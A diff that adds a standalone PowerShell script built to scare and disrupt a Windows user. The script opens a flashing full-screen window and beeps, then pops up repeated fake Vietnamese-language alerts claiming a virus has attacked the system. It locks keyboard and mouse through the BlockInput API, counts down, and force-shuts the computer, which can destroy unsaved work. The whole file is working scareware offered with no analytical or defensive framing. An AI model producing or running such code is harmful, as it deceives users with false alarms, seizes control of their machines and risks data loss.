@@ -1,0 +1,56 @@
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+
+function Start-FullScreenGlitch {
+    $form = New-Object Windows.Forms.Form
+    $form.WindowState = 'Maximized'
+    $form.FormBorderStyle = 'None'
+    $form.TopMost = $true
+    $form.BackColor = 'Black'
+    $form.ShowInTaskbar = $false
+    $graphics = $form.CreateGraphics()
+    $colors = @([Drawing.Color]::Red, [Drawing.Color]::White, [Drawing.Color]::Black, [Drawing.Color]::Lime)
+
+    $timer = New-Object Windows.Forms.Timer
+    $timer.Interval = 50
+    $timer.Add_Tick({
+        $brush = New-Object Drawing.SolidBrush (Get-Random -InputObject $colors)
+        $graphics.FillRectangle($brush, 0, 0, $form.Width, $form.Height)
+    })
+
+    $timer.Start()
+    $form.ShowDialog()
+}
+
+Start-Job {
+    for ($i = 0; $i -lt 50; $i++) {
+        [console]::beep((Get-Random -Minimum 200 -Maximum 2000), 100)
+        Start-Sleep -Milliseconds 50
+    }
+}
+
+Start-Job { Start-FullScreenGlitch } | Out-Null
+
+for ($i = 0; $i -lt 5; $i++) {
+    Start-Job {
+        [System.Windows.Forms.MessageBox]::Show("💀 ĐÃ PHÁT HIỆN VIRUS. HỆ THỐNG BỊ TẤN CÔNG!", "CRITICAL ERROR", 0, 16)
+    } | Out-Null
+    Start-Sleep -Milliseconds 500
+}
+
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+public class LockInput {
+    [DllImport("user32.dll")]
+    public static extern bool BlockInput(bool fBlockIt);
+}
+"@
+[LockInput]::BlockInput($true)
+
+for ($i = 5; $i -gt 0; $i--) {
+    Write-Host "🔒 TẤT CẢ BỊ KHÓA. TẮT MÁY TRONG $i GIÂY..." -ForegroundColor Red
+    Start-Sleep -Seconds 1
+}
+
+Stop-Computer -Force
